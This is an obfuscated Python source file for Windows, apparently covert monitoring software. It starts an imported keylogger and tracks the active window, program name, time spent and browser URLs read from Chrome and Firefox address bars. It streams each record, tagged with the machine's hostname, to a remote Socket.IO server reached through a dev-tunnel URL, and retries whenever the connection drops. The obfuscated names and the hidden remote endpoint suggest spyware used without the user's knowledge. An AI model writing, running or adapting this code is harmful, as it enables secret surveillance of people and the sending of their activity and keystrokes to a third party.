import asyncio #line:1
import logging #line:2
import datetime #line:3
import time #line:4
import signal #line:5
import os #line:6
import socket #line:7
import psutil #line:8
import win32gui #line:9
import win32process #line:10
import win32api #line:11
import pprint #line:12
import socketio #line:13
from collections import deque #line:14
from pywinauto import Application #line:15
from pywinauto .findwindows import find_windows #line:16
from keylogger import run_keylogger #line:17
logging .basicConfig (level =logging .DEBUG ,format ='%(asctime)s - %(levelname)s - %(message)s')#line:22
WEBSOCKET_URL ="https://gp49h60c-8000.inc1.devtunnels.ms/"#line:24
sio =socketio .AsyncClient ()#line:25
data_queue =deque ()#line:26
async def connect_websocket ():#line:29
    while True :#line:30
        try :#line:31
            await sio .connect (WEBSOCKET_URL )#line:32
            logging .debug ("WebSocket connected successfully.")#line:33
            return True #line:34
        except Exception as OOO00O000OO0000O0 :#line:35
            logging .error (f"WebSocket connection failed: {OOO00O000OO0000O0}")#line:36
            await asyncio .sleep (5 )#line:37
def get_chrome_url_by_title (O00OOO00OOOO0O000 ):#line:40
    O000O0000O00OOO00 =[]#line:41
    try :#line:43
        OO0OOOOOO0O0O0O0O =find_windows (title_re =".*Chrome.*")#line:45
        if not OO0OOOOOO0O0O0O0O :#line:47
            print ("No Chrome windows found.")#line:48
            return []#line:49
        for OO0OO0OO00O0000OO in OO0OOOOOO0O0O0O0O :#line:51
            try :#line:52
                O00OOO00O0000OOO0 =Application (backend ="uia").connect (handle =OO0OO0OO00O0000OO )#line:54
                OOO0OOO0000O0OO0O =O00OOO00O0000OOO0 .window (handle =OO0OO0OO00O0000OO )#line:57
                OO0O0O0OO000OO0OO =OOO0OOO0000O0OO0O .child_window (title ="Address and search bar",control_type ="Edit")#line:58
                O00OOO0OO0OO00OOO =OO0O0O0OO000OO0OO .get_value ()#line:59
                if O00OOO0OO0OO00OOO :#line:61
                    O000O0000O00OOO00 .append (O00OOO0OO0OO00OOO )#line:62
            except Exception as OOOOO0000OO0O00O0 :#line:63
                print (f"Error retrieving URL from window (handle {OO0OO0OO00O0000OO}): {OOOOO0000OO0O00O0}")#line:64
    except Exception as OOOOO0000OO0O00O0 :#line:66
        print (f"Error connecting to Chrome: {OOOOO0000OO0O00O0}")#line:67
    return O000O0000O00OOO00 #line:69
def get_firefox_urls ():#line:74
    O000000OO0OOO0OOO =[]#line:75
    try :#line:76
        O0OOO00O0OOOO0O0O =find_windows (title_re =".*Mozilla Firefox.*")#line:77
        if not O0OOO00O0OOOO0O0O :#line:78
            logging .debug ("No Firefox windows found.")#line:79
            return []#line:80
        for OO0OOOOOO0O0OO00O in O0OOO00O0OOOO0O0O :#line:82
            try :#line:83
                OOO0O0O00O0OOO0O0 =Application (backend ="uia").connect (handle =OO0OOOOOO0O0OO00O )#line:84
                O00OO00OO000OO0OO =OOO0O0O00O0OOO0O0 .window (handle =OO0OOOOOO0O0OO00O )#line:85
                O0OOOO000O00OO00O =O00OO00OO000OO0OO .child_window (title ="Search with Google or enter address",control_type ="Edit")#line:86
                OO00000O0000O0OOO =O0OOOO000O00OO00O .get_value ()#line:87
                if OO00000O0000O0OOO :#line:88
                    O000000OO0OOO0OOO .append (OO00000O0000O0OOO )#line:89
            except Exception as O00O000O0O000OOO0 :#line:90
                logging .error (f"Error retrieving Firefox URL from window (handle {OO0OOOOOO0O0OO00O}): {O00O000O0O000OOO0}")#line:91
    except Exception as O00O000O0O000OOO0 :#line:92
        logging .error (f"Error connecting to Firefox: {O00O000O0O000OOO0}")#line:93
    return O000000OO0OOO0OOO #line:94
class WindowTracker :#line:97
    def __init__ (OOO0O0OOO0O0O00OO ):#line:98
        OOO0O0OOO0O0O00OO .current_window =None #line:99
        OOO0O0OOO0O0O00OO .current_executable =None #line:100
        OOO0O0OOO0O0O00OO .start_time =None #line:101
        OOO0O0OOO0O0O00OO .url_cache ={}#line:102
        OOO0O0OOO0O0O00OO .url_update_interval =1 #line:103
        OOO0O0OOO0O0O00OO .min_tracking_duration =1 #line:104
    def update_window (OOO000OO00O0O0OO0 ,O0000000OOO0O0000 ):#line:106
        OO00OO0OO00OOOOO0 ,OOO0OO00OO0O00O00 =O0000000OOO0O0000 #line:107
        OO00OO0O00O0OO00O =datetime .datetime .now ()#line:108
        if OOO000OO00O0O0OO0 .current_window is None :#line:110
            OOO000OO00O0O0OO0 .current_window =OO00OO0OO00OOOOO0 #line:111
            OOO000OO00O0O0OO0 .current_executable =OOO0OO00OO0O00O00 #line:112
            OOO000OO00O0O0OO0 .start_time =OO00OO0O00O0OO00O #line:113
            return None ,None ,None ,None #line:114
        if OOO000OO00O0O0OO0 .current_window !=OO00OO0OO00OOOOO0 :#line:116
            O0O000O0OO00O0O0O =OOO000OO00O0O0OO0 .current_window #line:117
            OO00OOO0O0OOO00O0 =OOO000OO00O0O0OO0 .current_executable #line:118
            O000O00OOOOOO000O =OOO000OO00O0O0OO0 .start_time #line:119
            OOO000OO00O0O0OO0 .current_window =OO00OO0OO00OOOOO0 #line:121
            OOO000OO00O0O0OO0 .current_executable =OOO0OO00OO0O00O00 #line:122
            OOO000OO00O0O0OO0 .start_time =OO00OO0O00O0OO00O #line:123
            O0OOOOO0OOOO0O000 =(OO00OO0O00O0OO00O -O000O00OOOOOO000O ).total_seconds ()#line:125
            if O0OOOOO0OOOO0O000 >=OOO000OO00O0O0OO0 .min_tracking_duration :#line:126
                return O0O000O0OO00O0O0O ,OO00OOO0O0OOO00O0 ,O000O00OOOOOO000O ,OO00OO0O00O0OO00O #line:127
        return None ,None ,None ,None #line:129
    async def get_browser_url (O0OOO0000O0O0OO00 ,O00O0OO0O0000OO0O ,O0OO0OOO00O00OO00 ):#line:131
        OO0OO00OO0OO00O0O =time .time ()#line:132
        if O00O0OO0O0000OO0O in O0OOO0000O0O0OO00 .url_cache :#line:133
            O00OOO0OOOOO00000 ,OO00O000OO0OO0O00 =O0OOO0000O0O0OO00 .url_cache [O00O0OO0O0000OO0O ]#line:134
            if OO0OO00OO0OO00O0O -O00OOO0OOOOO00000 <O0OOO0000O0O0OO00 .url_update_interval :#line:135
                return OO00O000OO0OO0O00 #line:136
        OO00O000OO0OO0O00 =None #line:138
        if O00O0OO0O0000OO0O .lower ()=="chrome.exe":#line:139
            O00O00OO000OOO0O0 =get_chrome_url_by_title (O0OO0OOO00O00OO00 )#line:140
            OO00O000OO0OO0O00 =O00O00OO000OOO0O0 [0 ]if O00O00OO000OOO0O0 else None #line:141
        elif O00O0OO0O0000OO0O .lower ()=="firefox.exe":#line:142
            O00O00OO000OOO0O0 =get_firefox_urls ()#line:143
            OO00O000OO0OO0O00 =O00O00OO000OOO0O0 [0 ]if O00O00OO000OOO0O0 else None #line:144
        O0OOO0000O0O0OO00 .url_cache [O00O0OO0O0000OO0O ]=(OO0OO00OO0OO00O0O ,OO00O000OO0OO0O00 )#line:146
        return OO00O000OO0OO0O00 #line:147
async def send_data_to_websocket (OOO0OOOOOOOO0O0OO ,OO00O0O0OO0OO0O0O ):#line:149
    try :#line:150
        await sio .emit (OOO0OOOOOOOO0O0OO ,OO00O0O0OO0OO0O0O )#line:151
        logging .debug ("Data sent successfully.")#line:152
        while data_queue and sio .connected :#line:154
            O00OOOO00OOO0000O =data_queue .popleft ()#line:155
            await sio .emit (OOO0OOOOOOOO0O0OO ,O00OOOO00OOO0000O )#line:156
    except Exception as OOO0000OO000OOOO0 :#line:157
        logging .error (f"Error sending data: {str(OOO0000OO000OOOO0)}")#line:158
        data_queue .append (OO00O0O0OO0OO0O0O )#line:159
def get_active_window_info ()->tuple [str ,str ]:#line:161
    try :#line:162
        O00O00O0OOO000O00 =win32gui .GetForegroundWindow ()#line:163
        _OOO0000O0000OO000 ,O0OOOO0OOOOO000OO =win32process .GetWindowThreadProcessId (O00O00O0OOO000O00 )#line:164
        if psutil .pid_exists (O0OOOO0OOOOO000OO ):#line:166
            OO0O0OOOO0OOOO00O =psutil .Process (O0OOOO0OOOOO000OO )#line:167
            O0O0OOOOOOO000OO0 =OO0O0OOOO0OOOO00O .name ()#line:168
            O0O00OO00OOOO0000 =win32gui .GetWindowText (O00O00O0OOO000O00 )#line:169
            return O0O00OO00OOOO0000 ,O0O0OOOOOOO000OO0 #line:170
    except Exception as OOOOO00O0OO000O00 :#line:171
        logging .error (f"Error getting active window info: {str(OOOOO00O0OO000O00)}")#line:172
    return None ,None #line:173
def extract_application_name (O000OO000O00O000O ,OO000O000O00O0O00 ):#line:175
    if OO000O000O00O0O00 and OO000O000O00O0O00 .lower ()in ['chrome.exe','firefox.exe','msedge.exe','safari.exe','opera.exe','brave.exe']:#line:176
        if ' - 'in O000OO000O00O000O :#line:177
            O0000O000OO000O00 =O000OO000O00O000O .split (' - ')#line:178
            O00O0O00O000OO0O0 =O0000O000OO000O00 [0 ]#line:179
            O0000O00O00OO000O =O0000O000OO000O00 [-1 ]#line:180
            return O00O0O00O000OO0O0 ,O0000O00O00OO000O #line:181
        else :#line:182
            return O000OO000O00O000O ,OO000O000O00O0O00 #line:183
    else :#line:184
        if ' - 'in O000OO000O00O000O :#line:185
            O00O0O00O000OO0O0 =O000OO000O00O000O .split (' - ')[-1 ]#line:186
            return O00O0O00O000OO0O0 ,""#line:187
        else :#line:188
            return O000OO000O00O000O ,""#line:189
def is_browser (O0000O000000O000O ):#line:191
    if O0000O000000O000O is None :#line:192
        return False #line:193
    return O0000O000000O000O .lower ()in ["chrome.exe","firefox.exe","msedge.exe","safari.exe","opera.exe","brave.exe"]#line:198
def validate_window_info (OOOOOOOO00O0OO0O0 ,O0OOOOOO0O00O0O00 ):#line:200
    return OOOOOOOO00O0OO0O0 and O0OOOOOO0O00O0O00 #line:201
async def shutdown ():#line:203
    await sio .disconnect ()#line:204
    logging .info ("Disconnected and shutting down...")#line:205
async def main ():#line:207
    OO000O00000O00OOO =run_keylogger ()#line:208
    if not await connect_websocket ():#line:209
        logging .error ("Failed to establish initial connection")#line:210
        return #line:211
    OOOO0OOO0O0000O00 =socket .gethostname ()#line:213
    OOO000O00OO00O0OO =WindowTracker ()#line:214
    try :#line:216
        while True :#line:217
            try :#line:218
                O000OOO00O0O00000 =get_active_window_info ()#line:219
                if not O000OOO00O0O00000 or not validate_window_info (*O000OOO00O0O00000 ):#line:220
                    await asyncio .sleep (0.1 )#line:221
                    continue #line:222
                OO0OO0O00OOOO000O ,O0O0O0OOOOOOO00O0 ,OOO0O00O0OO0OOOOO ,OO0O0O0OO0O000O0O =OOO000O00OO00O0OO .update_window (O000OOO00O0O00000 )#line:224
                if OO0OO0O00OOOO000O and OOO0O00O0OO0OOOOO and OO0O0O0OO0O000O0O :#line:226
                    O000OO00OOOO00O0O ,OO0000O0OO0OO0O0O =extract_application_name (OO0OO0O00OOOO000O ,O0O0O0OOOOOOO00O0 )#line:227
                    OO0O00000OO0OOOO0 =None #line:228
                    if is_browser (O0O0O0OOOOOOO00O0 ):#line:229
                        OO0O00000OO0OOOO0 =await OOO000O00OO00O0OO .get_browser_url (O0O0O0OOOOOOO00O0 ,OO0OO0O00OOOO000O )#line:230
                    O0OO00OOOOO0O0OOO =(OO0O0O0OO0O000O0O -OOO0O00O0OO0OOOOO ).total_seconds ()#line:233
                    OO0O00O0O0OOO000O ={'pc_name':OOOO0OOO0O0000O00 ,'active_window':OO0OO0O00OOOO000O ,'executable':O0O0O0OOOOOOO00O0 ,'website':O000OO00OOOO00O0O ,'browser':OO0000O0OO0OO0O0O ,'url':OO0O00000OO0OOOO0 ,'start_time':OOO0O00O0OO0OOOOO .strftime ('%Y-%m-%d %H:%M:%S'),'end_time':OO0O0O0OO0O000O0O .strftime ('%Y-%m-%d %H:%M:%S'),'time_spent':O0OO00OOOOO0O0OOO ,}#line:245
                    await send_data_to_websocket ('log_data',OO0O00O0O0OOO000O )#line:246
                    pprint .pprint (OO0O00O0O0OOO000O )#line:247
                await asyncio .sleep (0.1 )#line:249
            except Exception as OO0OOOOO0000OO00O :#line:251
                logging .error (f"Error in main loop: {OO0OOOOO0000OO00O}")#line:252
                await asyncio .sleep (1 )#line:253
    except asyncio .CancelledError :#line:254
        logging .info ("Main loop cancelled")#line:255
    finally :#line:256
        await shutdown ()#line:257
if __name__ =="__main__":#line:259
    import sys #line:260
    if os .name =='nt':#line:261
        def handle_windows_signal (OO00OOO0000OOO00O ):#line:262
            if OO00OOO0000OOO00O in (signal .SIGINT ,signal .SIGTERM ):#line:263
                asyncio .run (shutdown ())#line:264
            return True #line:265
        win32api .SetConsoleCtrlHandler (handle_windows_signal ,True )#line:266
    asyncio .run (main ())#line:268